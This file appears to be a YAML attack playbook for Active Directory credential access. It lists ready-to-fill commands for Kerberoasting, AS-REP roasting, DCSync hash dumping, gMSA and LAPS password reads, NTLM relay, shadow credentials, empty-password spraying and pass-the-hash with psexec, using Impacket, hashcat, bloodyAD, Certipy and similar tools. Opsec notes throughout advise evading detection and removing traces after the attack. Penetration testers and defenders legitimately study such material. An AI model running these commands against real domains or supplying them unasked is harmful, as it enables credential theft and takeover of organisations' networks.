# Credential Access Abuse Commands
# Attacks: Kerberoasting, AS-REP Roasting, DCSync, etc.

Kerberoasting:
  description: "Request and crack TGS tickets for accounts with SPNs"
  commands:
    - name: "Request TGS tickets"
      tool: Impacket
      command: |
        GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
    - name: "Request TGS tickets (outputfile)"
      tool: Impacket
      command: |
        GetUserSPNs.py -request -dc-ip <DC_IP> -outputfile kerberoast.txt '<DOMAIN>/<USERNAME>:<PASSWORD>'
    - name: "Request specific user TGS"
      tool: Impacket
      command: |
        GetUserSPNs.py -request -dc-ip <DC_IP> -target-user <TARGET> '<DOMAIN>/<USERNAME>:<PASSWORD>'
    - name: "Crack with hashcat"
      tool: hashcat
      command: |
        hashcat -m 13100 kerberoast.txt /path/to/wordlist.txt
    - name: "Crack with john"
      tool: john
      command: |
        john --wordlist=/path/to/wordlist.txt kerberoast.txt
  opsec:
    - "Creates Event ID 4769 (Kerberos Service Ticket Request)"
    - "RC4 encryption type (0x17) is more suspicious than AES"
    - "Consider requesting AES tickets only to blend in"

ASREPRoasting:
  description: "Request AS-REP for accounts without pre-authentication"
  commands:
    - name: "Get AS-REP hashes"
      tool: Impacket
      command: |
        GetNPUsers.py -dc-ip <DC_IP> -no-pass -usersfile users.txt '<DOMAIN>/'
    - name: "Get AS-REP for specific user"
      tool: Impacket
      command: |
        GetNPUsers.py -dc-ip <DC_IP> -no-pass '<DOMAIN>/<TARGET>'
    - name: "Get AS-REP hashes (outputfile)"
      tool: Impacket
      command: |
        GetNPUsers.py -dc-ip <DC_IP> -no-pass -outputfile asrep.txt '<DOMAIN>/' -usersfile users.txt
    - name: "Crack with hashcat"
      tool: hashcat
      command: |
        hashcat -m 18200 asrep.txt /path/to/wordlist.txt
    - name: "Crack with john"
      tool: john
      command: |
        john --wordlist=/path/to/wordlist.txt asrep.txt
  opsec:
    - "Creates Event ID 4768 with pre-auth type 0"
    - "No authentication required to request AS-REP"
    - "Can be performed without valid credentials"

DCSync:
  description: "Replicate credentials from domain controller (requires GetChanges + GetChangesAll)"
  commands:
    - name: "DCSync all hashes"
      tool: Impacket
      command: |
        secretsdump.py '<DOMAIN>/<USERNAME>:<PASSWORD>'@<DC_IP>
    - name: "DCSync specific user (krbtgt)"
      tool: Impacket
      command: |
        secretsdump.py -just-dc-user krbtgt '<DOMAIN>/<USERNAME>:<PASSWORD>'@<DC_IP>
    - name: "DCSync specific user (Administrator)"
      tool: Impacket
      command: |
        secretsdump.py -just-dc-user Administrator '<DOMAIN>/<USERNAME>:<PASSWORD>'@<DC_IP>
    - name: "DCSync NTDS only"
      tool: Impacket
      command: |
        secretsdump.py -just-dc-ntlm '<DOMAIN>/<USERNAME>:<PASSWORD>'@<DC_IP>
  opsec:
    - "Creates Event ID 4662 with specific replication GUIDs"
    - "Highly detectable by most security tools"
    - "Consider targeting specific high-value accounts only"
    - "Replication traffic visible on network"

GMSA:
  description: "Read gMSA password from msDS-ManagedPassword attribute"
  commands:
    - name: "Read gMSA password"
      tool: bloodyAD
      command: |
        bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> get object '<TARGET>$' --attr msDS-ManagedPassword
    - name: "Read gMSA password (gMSADumper)"
      tool: gMSADumper
      command: |
        python3 gMSADumper.py -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>'
    - name: "Use gMSA hash for authentication"
      tool: Impacket
      command: |
        secretsdump.py -hashes :<GMSA_HASH> '<DOMAIN>/<TARGET>$'@<DC_IP>
  opsec:
    - "Reading gMSA password may be logged"
    - "gMSA password rotates automatically every 30 days"

LAPS:
  description: "Read LAPS password from ms-Mcs-AdmPwd attribute"
  commands:
    - name: "Read LAPS password"
      tool: bloodyAD
      command: |
        bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> get object '<TARGET>$' --attr ms-mcs-AdmPwd
    - name: "Read LAPS password (ldapsearch)"
      tool: ldapsearch
      command: |
        ldapsearch -x -H ldap://<DC_IP> -D '<USERNAME>@<DOMAIN>' -w '<PASSWORD>' -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' '(name=<TARGET>)' ms-mcs-AdmPwd
    - name: "Read LAPS password (CrackMapExec)"
      tool: CrackMapExec
      command: |
        crackmapexec ldap <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' --module laps
  opsec:
    - "LAPS password read may be logged depending on configuration"
    - "LAPS password rotates after expiration"
    - "Windows LAPS (v2) uses different attributes"

NTLMRelay:
  description: "Relay captured NTLM authentication to other services"
  commands:
    - name: "Relay to LDAP (for ACL abuse)"
      tool: Impacket
      command: |
        ntlmrelayx.py -t ldap://<DC_IP> --escalate-user <ATTACKER_USER>
    - name: "Relay to SMB"
      tool: Impacket
      command: |
        ntlmrelayx.py -t smb://<TARGET_IP> -smb2support
    - name: "Relay to LDAPS (for shadow credentials)"
      tool: Impacket
      command: |
        ntlmrelayx.py -t ldaps://<DC_IP> --shadow-credentials --shadow-target '<TARGET>$'
  opsec:
    - "Requires machine-in-the-middle position"
    - "LDAP signing/channel binding blocks LDAP relay"
    - "SMB signing blocks SMB relay"

PasswdNotReqd:
  description: "PASSWD_NOTREQD flag - account may have empty password"
  commands:
    - name: "Test for empty password (CrackMapExec)"
      tool: CrackMapExec
      command: |
        crackmapexec smb <DC_IP> -u '<TARGET>' -p ''
    - name: "Test for empty password (smbclient)"
      tool: smbclient
      command: |
        smbclient -L //<DC_IP> -U '<DOMAIN>\<TARGET>' -N
    - name: "Test for empty password (rpcclient)"
      tool: rpcclient
      command: |
        rpcclient -U '<DOMAIN>\<TARGET>%' <DC_IP>
    - name: "Spray empty password on multiple users"
      tool: kerbrute
      command: |
        kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt ''
  opsec:
    - "Empty password authentication may be logged as Event ID 4625 (failed) or 4624 (success)"
    - "Multiple failed attempts may trigger account lockout"
    - "PASSWD_NOTREQD doesn't guarantee empty password, just allows it"

ShadowCredentials:
  description: "Shadow Credentials attack - add msDS-KeyCredentialLink for PKINIT auth"
  commands:
    - name: "Add shadow credentials"
      tool: Certipy
      command: |
        certipy shadow auto -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -account <TARGET>
    - name: "Add shadow credentials (pywhisker)"
      tool: pywhisker
      command: |
        python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<TARGET>' --action add --dc-ip <DC_IP>
    - name: "Request TGT with certificate"
      tool: Certipy
      command: |
        certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP>
    - name: "List existing shadow credentials"
      tool: pywhisker
      command: |
        python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<TARGET>' --action list --dc-ip <DC_IP>
    - name: "Remove shadow credentials"
      tool: pywhisker
      command: |
        python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<TARGET>' --action remove --device-id <DEVICE_ID> --dc-ip <DC_IP>
  opsec:
    - "Modifies msDS-KeyCredentialLink attribute (Event ID 5136)"
    - "Requires GenericWrite or GenericAll on target"
    - "ADCS must be present for PKINIT authentication"
    - "Can be detected by monitoring KeyCredentialLink changes"

ReadLAPSPassword:
  description: "Read LAPS password from ms-Mcs-AdmPwd attribute"
  commands:
    - name: "Read LAPS password"
      tool: bloodyAD
      command: |
        bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> get object '<TARGET>$' --attr ms-mcs-AdmPwd
    - name: "Read LAPS password (ldapsearch)"
      tool: ldapsearch
      command: |
        ldapsearch -x -H ldap://<DC_IP> -D '<USERNAME>@<DOMAIN>' -w '<PASSWORD>' -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' '(name=<TARGET>)' ms-mcs-AdmPwd
    - name: "Read LAPS password (CrackMapExec)"
      tool: CrackMapExec
      command: |
        crackmapexec ldap <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' -M laps
    - name: "Read Windows LAPS (new attribute)"
      tool: bloodyAD
      command: |
        bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> get object '<TARGET>$' --attr msLAPS-Password,msLAPS-EncryptedPassword
    - name: "Use LAPS password"
      tool: Impacket
      command: |
        psexec.py '<TARGET>/Administrator:<LAPS_PASSWORD>'@<TARGET>
  opsec:
    - "LAPS password read may be logged depending on configuration"
    - "LAPS password rotates after expiration"
    - "Windows LAPS (v2) uses different attributes and may be encrypted"

ReadGMSAPassword:
  description: "Read gMSA password from msDS-ManagedPassword attribute"
  commands:
    - name: "Read gMSA password"
      tool: gMSADumper
      command: |
        python3 gMSADumper.py -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>'
    - name: "Read gMSA password (bloodyAD)"
      tool: bloodyAD
      command: |
        bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> get object '<TARGET>$' --attr msDS-ManagedPassword
    - name: "Parse gMSA blob manually"
      tool: Python
      command: |
        # The msDS-ManagedPassword blob contains the NT hash
        # Use gMSADumper or bloodyAD to parse it automatically
    - name: "Use gMSA hash for authentication"
      tool: Impacket
      command: |
        secretsdump.py -hashes :<GMSA_HASH> '<DOMAIN>/<TARGET>$'@<DC_IP>
    - name: "Pass-the-hash with gMSA"
      tool: Impacket
      command: |
        psexec.py -hashes :<GMSA_HASH> '<DOMAIN>/<TARGET>$'@<TARGET_SERVER>
  opsec:
    - "Reading gMSA password requires being in PrincipalsAllowedToRetrieveManagedPassword"
    - "gMSA password rotates automatically every 30 days"
    - "gMSA accounts are computer-type accounts (end with $)"

WriteSPN:
  description: "Write SPN attribute for targeted Kerberoasting"
  commands:
    - name: "Set SPN on user (targeted Kerberoasting)"
      tool: bloodyAD
      command: |
        bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set object <TARGET> servicePrincipalName -v 'HTTP/<TARGET>'
    - name: "Set SPN (PowerView)"
      tool: PowerView
      command: |
        Set-DomainObject -Identity <TARGET> -SET @{serviceprincipalname='HTTP/<TARGET>'}
    - name: "Request TGS for the new SPN"
      tool: Impacket
      command: |
        GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
    - name: "Crack the hash"
      tool: hashcat
      command: |
        hashcat -m 13100 tgs_hash.txt /path/to/wordlist.txt
    - name: "Remove SPN after attack"
      tool: bloodyAD
      command: |
        bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set object <TARGET> servicePrincipalName -v ''
  opsec:
    - "SPN modification creates Event ID 5136"
    - "Consider removing SPN after obtaining hash"
    - "Kerberoasting creates Event ID 4769"

AddKeyCredentialLink:
  description: "Add shadow credentials to target (same as ShadowCredentials)"
  commands:
    - name: "Add shadow credentials"
      tool: Certipy
      command: |
        certipy shadow auto -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -account <TARGET>
    - name: "Add shadow credentials (pywhisker)"
      tool: pywhisker
      command: |
        python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<TARGET>' --action add --dc-ip <DC_IP>
  opsec:
    - "Modifies msDS-KeyCredentialLink attribute (Event ID 5136)"
    - "Requires GenericWrite or GenericAll on target"

GetChanges:
  description: "DS-Replication-Get-Changes right (partial DCSync)"
  commands:
    - name: "Note - requires GetChangesAll too"
      tool: note
      command: |
        # GetChanges alone is NOT sufficient for DCSync
        # You need BOTH GetChanges AND GetChangesAll
        # Check if principal also has GetChangesAll
    - name: "Check for GetChangesAll"
      tool: bloodyAD
      command: |
        bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> get object 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' --attr nTSecurityDescriptor --resolve-sd
  opsec:
    - "GetChanges without GetChangesAll cannot replicate password data"
    - "Can only replicate non-sensitive attributes"

GetChangesAll:
  description: "DS-Replication-Get-Changes-All right (enables DCSync with GetChanges)"
  commands:
    - name: "DCSync attack (if you also have GetChanges)"
      tool: Impacket
      command: |
        secretsdump.py '<DOMAIN>/<USERNAME>:<PASSWORD>'@<DC_IP>
    - name: "DCSync specific user"
      tool: Impacket
      command: |
        secretsdump.py -just-dc-user krbtgt '<DOMAIN>/<USERNAME>:<PASSWORD>'@<DC_IP>
  opsec:
    - "GetChangesAll with GetChanges = full DCSync capability"
    - "Creates Event ID 4662 with replication GUIDs"
    - "Highly detectable"
